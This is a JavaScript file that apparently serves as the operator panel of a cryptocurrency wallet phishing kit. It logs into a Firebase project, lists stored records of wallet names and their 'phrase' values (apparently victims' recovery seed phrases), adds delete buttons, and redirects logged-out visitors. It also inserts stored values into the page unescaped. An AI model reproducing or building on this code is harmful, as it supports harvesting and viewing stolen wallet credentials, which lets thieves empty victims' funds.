// import firebase from "https://cdn.skypack.dev/firebase/compat/app";
// import "https://cdn.skypack.dev/firebase/compat/auth";
// import "https://cdn.skypack.dev/firebase/compat/firestore";

const firebaseConfig = {
    apiKey: "AIzaSyClkGm_12G7cTfKbbKe3LKBaNTOdihnD78",
    authDomain: "snsdapp.firebaseapp.com",
    projectId: "snsdapp",
    storageBucket: "snsdapp.appspot.com",
    messagingSenderId: "1061275208460",
};

firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();
const auth = firebase.auth();

const rootDIV = document.querySelector('#root');


function deleteTodo(event) {
  let button = event.target
  let docId = button.parentElement.id


  if (confirm('delete sure?')) {
    console.log(docId)
    db.collection('data').doc(docId).delete()
      .then(() => {
        alert('Data Deleted')
        window.location.reload();
      })
      .catch((err) => {
        console.log(err)
      })

  }

}


//get data
 db.collection("data").get().then((querySnapshot) => {
 querySnapshot.forEach((doc) => {
// doc.data() is never undefined for query doc snapshots

// console.log(doc.id, " => ", doc.data());

let wallet = doc.data().wallet
let phrase = doc.data().phrase

// console.log(`Wallet: ${wallet} <br> ${phrase}`)

let text = `<p>Wallet: ${wallet} <br> ${phrase}</p><br>`
// let para = document.createElement("div")
// para.innerHTML = text
// rootDIV.appendChild(para)
 
   let line = document.createElement("div");
   line.id = doc.id;
   line.innerHTML = text
   rootDIV.appendChild(line)


//del button
let delBtn = document.createElement("button")
   delBtn.setAttribute("style", "background-color: rgb(54, 57, 63); color:white;")
   delBtn.innerHTML = "ðŸ—‘ï¸"
delBtn.addEventListener("click", deleteTodo)
line.prepend(delBtn)


});
});



document.querySelector('#logout').addEventListener("click", signoutpage)
function signoutpage() {
firebase.auth().signOut();

}

 firebase.auth().onAuthStateChanged((user) => {
    if (user) {
      // User is signed in, see docs for a list of available properties
      // https://firebase.google.com/docs/reference/js/firebase.User
      var uid = user.uid;
      // ...
    } else {
      location.href = "https://sindikato.pages.dev/alex";
    }
  });
